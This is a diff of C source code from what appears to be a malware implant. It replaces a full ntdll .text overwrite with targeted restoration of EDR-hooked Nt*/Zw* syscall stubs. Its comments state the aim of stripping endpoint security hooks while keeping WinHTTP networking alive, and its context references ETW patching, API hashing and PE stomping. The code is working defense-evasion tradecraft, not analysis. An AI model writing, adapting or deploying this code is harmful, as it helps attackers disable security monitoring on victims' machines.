@@ -126,102 +126,47 @@ BOOL evasion_patch_etw(void) {
 
 
 /* ═══════════════════════════════════════════════════════════════════
- *  NTDLL UNHOOK
+ *  NTDLL UNHOOK — TARGETED PER-STUB
  * ═══════════════════════════════════════════════════════════════════ */
 
-/* Relocation type constants (MinGW safety) */
-#ifndef IMAGE_REL_BASED_DIR64
-#define IMAGE_REL_BASED_DIR64  10
-#endif
-
 /*
- * After copying .text from the clean SEC_IMAGE mapping (based at pClean)
- * into the loaded ntdll (based at hNtdll), absolute addresses in .text
- * still point relative to pClean.  Fix them by adding the delta so they
- * point relative to hNtdll.  Without this, any relocated instruction
- * (jump tables, global refs) is corrupted — breaking NtCreateThreadEx
- * and every function that depends on an absolute address.
+ * TARGETED per-stub ntdll unhooking.
+ *
+ * The old approach copied the ENTIRE .text section (~1.5 MB) from a clean
+ * SEC_IMAGE mapping over the loaded ntdll.  This reverts Windows in-memory
+ * hotfixes (KB patches applied to ntdll at load time) and corrupts internal
+ * helper functions that WinHTTP and other high-level networking APIs depend
+ * on — causing WinHttpSendRequest to hang indefinitely.
+ *
+ * The new approach walks the clean ntdll's export table and only restores
+ * individual Nt*/Zw* syscall stubs that an EDR has actually hooked:
+ *
+ *  1. Map a clean copy of ntdll from disk (SEC_IMAGE)
+ *  2. Walk the clean ntdll's export directory
+ *  3. For each export that is a syscall stub (clean copy starts with
+ *     4C 8B D1 = "mov r10, rcx"):
+ *       - Compare the first STUB_PATCH_SIZE bytes in the loaded copy
+ *       - If they differ (hooked by EDR), overwrite with the clean bytes
+ *  4. Leave everything else in .text untouched
+ *
+ * This removes EDR inline hooks while preserving Windows hotfixes,
+ * so WinHTTP / WinINet / networking continues to work.
+ *
+ * No relocation fixups are needed because x64 syscall stubs use only
+ * RIP-relative addressing in their first ~24 bytes (the stub body is
+ * mov r10,rcx / mov eax,SSN / test / jne / syscall / ret / int 2E / ret).
  */
-static void _fixup_text_relocations(BYTE *pLoadedBase, BYTE *pCleanBase,
-                                     PIMAGE_NT_HEADERS pNtHeaders,
-                                     DWORD textRVA, DWORD textSize)
-{
-    LONG_PTR delta = (LONG_PTR)(pLoadedBase - pCleanBase);
-    if (delta == 0) return;  /* Same base — nothing to fix */
 
-    DWORD relocDirRVA  = pNtHeaders->OptionalHeader
-                             .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
-                             .VirtualAddress;
-    DWORD relocDirSize = pNtHeaders->OptionalHeader
-                             .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
-                             .Size;
-    if (relocDirRVA == 0 || relocDirSize == 0) return;
-
-    /* Walk the .reloc section in the LOADED ntdll (we didn't overwrite it) */
-    BYTE *pReloc    = pLoadedBase + relocDirRVA;
-    DWORD processed = 0;
-    DWORD fixCount  = 0;
-
-    while (processed < relocDirSize) {
-        IMAGE_BASE_RELOCATION *block = (IMAGE_BASE_RELOCATION *)(pReloc + processed);
-        if (block->SizeOfBlock == 0 || block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION))
-            break;
-
-        DWORD nEntries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
-        WORD *entries  = (WORD *)((BYTE *)block + sizeof(IMAGE_BASE_RELOCATION));
-
-        for (DWORD i = 0; i < nEntries; i++) {
-            BYTE  type   = (BYTE)(entries[i] >> 12);
-            WORD  offset = entries[i] & 0x0FFF;
-
-            if (type == IMAGE_REL_BASED_ABSOLUTE) continue;  /* padding */
-
-            DWORD entryRVA = block->VirtualAddress + offset;
-
-            /* Only fix entries that land inside .text */
-            if (entryRVA < textRVA || entryRVA >= textRVA + textSize)
-                continue;
-
-            BYTE *pPatch = pLoadedBase + entryRVA;
-
-            if (type == IMAGE_REL_BASED_DIR64) {          /* x64: 8-byte abs addr */
-                *(ULONGLONG *)pPatch += (ULONGLONG)delta;
-                fixCount++;
-            } else if (type == IMAGE_REL_BASED_HIGHLOW) { /* x86: 4-byte abs addr */
-                *(ULONG *)pPatch += (ULONG)delta;
-                fixCount++;
-            }
-        }
-
-        processed += block->SizeOfBlock;
-    }
-
-    DBG("[evasion] ntdll reloc fixup: delta=0x%llX, %u entries patched in .text",
-        (unsigned long long)delta, fixCount);
-}
+#define STUB_PATCH_SIZE 32   /* bytes to restore per hooked stub */
 
 BOOL evasion_unhook_ntdll(void) {
-    /*
-     * Restore ntdll.dll .text section from a clean copy on disk.
-     *
-     * EDRs hook ntdll by overwriting the first bytes of functions with
-     * JMP instructions to their monitoring code. We read the original
-     * ntdll.dll from C:\Windows\System32\ntdll.dll, map it as SEC_IMAGE,
-     * and overwrite the hooked .text section with the clean one.
-     *
-     * CRITICAL: the SEC_IMAGE mapping lands at a different ASLR base
-     * than the loaded ntdll.  After copying .text, we must fix up
-     * absolute-address relocations by adding the base delta.  Without
-     * this, NtCreateThreadEx and other functions with relocation entries
-     * are corrupted, breaking all thread creation in the process.
-     */
+
+    /* ── 1. Find the loaded ntdll base via PEB walk ── */
     HMODULE hNtdll = NULL;
     {
         void *anyFunc = api_resolve(HASH_NTDLL, HASH_NtClose);
         if (!anyFunc) return FALSE;
-        /* Walk backwards to find module base (PE header) */
         unsigned char *p = (unsigned char *)anyFunc;
-        /* Align down to 64K boundary and search for MZ header */
         p = (unsigned char *)((ULONG_PTR)p & ~0xFFFF);
         for (int i = 0; i < 256; i++) {
             if (*(USHORT *)p == IMAGE_DOS_SIGNATURE) {
@@ -235,7 +180,7 @@ BOOL evasion_unhook_ntdll(void) {
 
     DBG("[evasion] ntdll loaded base = %p", (void *)hNtdll);
 
-    /* Read clean ntdll from disk */
+    /* ── 2. Map a clean copy of ntdll from disk (SEC_IMAGE) ── */
     wchar_t ntdllPath[MAX_PATH];
     GetSystemDirectoryW(ntdllPath, MAX_PATH);
     wcscat(ntdllPath, L"\\ntdll.dll");
@@ -259,55 +204,92 @@ BOOL evasion_unhook_ntdll(void) {
         return FALSE;
     }
 
-    DBG("[evasion] ntdll clean mapping base = %p (delta=0x%llX)",
-        pClean, (unsigned long long)((BYTE *)hNtdll - (BYTE *)pClean));
+    DBG("[evasion] ntdll clean mapping base = %p", pClean);
 
-    /* Use loaded ntdll's PE headers (intact at this point — PE stomp runs later) */
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
-    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
-        ((BYTE *)hNtdll + dosHeader->e_lfanew);
-    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
-    WORD numSections = ntHeaders->FileHeader.NumberOfSections;
+    /* ── 3. Parse the CLEAN ntdll's export directory ── */
+    PIMAGE_DOS_HEADER dosClean = (PIMAGE_DOS_HEADER)pClean;
+    PIMAGE_NT_HEADERS ntClean  = (PIMAGE_NT_HEADERS)
+        ((BYTE *)pClean + dosClean->e_lfanew);
 
-    BOOL patched = FALSE;
+    DWORD exportRVA  = ntClean->OptionalHeader
+                           .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+                           .VirtualAddress;
+    DWORD exportSize = ntClean->OptionalHeader
+                           .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+                           .Size;
 
-    for (WORD i = 0; i < numSections; i++) {
-        if (memcmp(section[i].Name, ".text", 5) == 0) {
-            DWORD textSize = section[i].Misc.VirtualSize;
-            DWORD textRVA  = section[i].VirtualAddress;
+    if (exportRVA == 0) {
+        DBG("[evasion] ntdll has no export directory?!");
+        UnmapViewOfFile(pClean);
+        CloseHandle(hMapping);
+        CloseHandle(hFile);
+        return FALSE;
+    }
 
-            void *pHooked   = (BYTE *)hNtdll + textRVA;
-            void *pOriginal = (BYTE *)pClean + textRVA;
+    IMAGE_EXPORT_DIRECTORY *pExports = (IMAGE_EXPORT_DIRECTORY *)
+        ((BYTE *)pClean + exportRVA);
 
-            DBG("[evasion] ntdll .text: RVA=0x%X size=0x%X", textRVA, textSize);
+    DWORD *nameRVAs = (DWORD *)((BYTE *)pClean + pExports->AddressOfNames);
+    WORD  *ordinals = (WORD  *)((BYTE *)pClean + pExports->AddressOfNameOrdinals);
+    DWORD *funcRVAs = (DWORD *)((BYTE *)pClean + pExports->AddressOfFunctions);
 
-            /* Make hooked .text writable */
-            DWORD oldProtect;
-            if (!VirtualProtect(pHooked, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-                DBG("[evasion] VirtualProtect failed err=%u", GetLastError());
-                break;
-            }
+    DWORD stubsScanned = 0;
+    DWORD stubsUnhooked = 0;
 
-            /* Overwrite hooked .text with clean bytes */
-            memcpy(pHooked, pOriginal, textSize);
+    /* ── 4. Walk exports, restore only hooked syscall stubs ── */
+    for (DWORD i = 0; i < pExports->NumberOfNames; i++) {
+        const char *name = (const char *)((BYTE *)pClean + nameRVAs[i]);
 
-            /* Fix up absolute-address relocations for the base delta */
-            _fixup_text_relocations((BYTE *)hNtdll, (BYTE *)pClean,
-                                     ntHeaders, textRVA, textSize);
+        /* Only look at Nt* and Zw* exports (syscall stubs) */
+        if (!((name[0] == 'N' && name[1] == 't') ||
+              (name[0] == 'Z' && name[1] == 'w')))
+            continue;
 
-            /* Restore protection */
-            VirtualProtect(pHooked, textSize, oldProtect, &oldProtect);
-            patched = TRUE;
-            DBG("[evasion] ntdll .text restored + relocations fixed");
-            break;
+        /* Skip NtdllDefWindowProc_ etc. — not syscall stubs */
+        if (name[0] == 'N' && name[1] == 't' && name[2] == 'd')
+            continue;
+
+        DWORD funcRVA = funcRVAs[ordinals[i]];
+
+        /* Skip forwarded exports (RVA falls within the export directory) */
+        if (funcRVA >= exportRVA && funcRVA < exportRVA + exportSize)
+            continue;
+
+        BYTE *pCleanFunc  = (BYTE *)pClean  + funcRVA;
+        BYTE *pLoadedFunc = (BYTE *)hNtdll  + funcRVA;
+
+        /*
+         * Verify this is really a syscall stub in the clean copy:
+         * x64 stubs start with  4C 8B D1  =  mov r10, rcx
+         */
+        if (pCleanFunc[0] != 0x4C || pCleanFunc[1] != 0x8B || pCleanFunc[2] != 0xD1)
+            continue;
+
+        stubsScanned++;
+
+        /* If the loaded copy matches the clean copy, it's not hooked — skip */
+        if (memcmp(pLoadedFunc, pCleanFunc, STUB_PATCH_SIZE) == 0)
+            continue;
+
+        /* ── Hooked! Restore just this stub's first STUB_PATCH_SIZE bytes ── */
+        DWORD oldProtect;
+        if (VirtualProtect(pLoadedFunc, STUB_PATCH_SIZE,
+                           PAGE_EXECUTE_READWRITE, &oldProtect)) {
+            memcpy(pLoadedFunc, pCleanFunc, STUB_PATCH_SIZE);
+            VirtualProtect(pLoadedFunc, STUB_PATCH_SIZE, oldProtect, &oldProtect);
+            stubsUnhooked++;
         }
     }
 
+    DBG("[evasion] ntdll targeted unhook: %u syscall stubs scanned, %u restored",
+        stubsScanned, stubsUnhooked);
+
+    /* ── 5. Cleanup ── */
     UnmapViewOfFile(pClean);
     CloseHandle(hMapping);
     CloseHandle(hFile);
 
-    return patched;
+    return TRUE;
 }
 
 
